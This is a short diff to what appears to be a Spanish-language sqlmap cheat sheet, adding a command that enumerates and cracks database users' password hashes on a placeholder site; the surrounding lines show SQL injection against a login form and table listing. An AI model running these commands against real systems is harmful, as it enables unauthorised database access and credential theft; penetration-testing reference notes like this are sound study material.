@@ -43,6 +43,11 @@ sqlmap -u 'http://prueba.com/info.php?action=login' --data="username=abc&passwor
 
 <br>
 
+Enumera y craking de las contraseñas de los usuarios de la BD
+```
+sqlmap -u "http://www.prueba.com/?id=1" --passwords --batch
+```
+
 
 ```
 sqlmap -u "http://prueba.com/info.php?action=login" --tables -D testdb
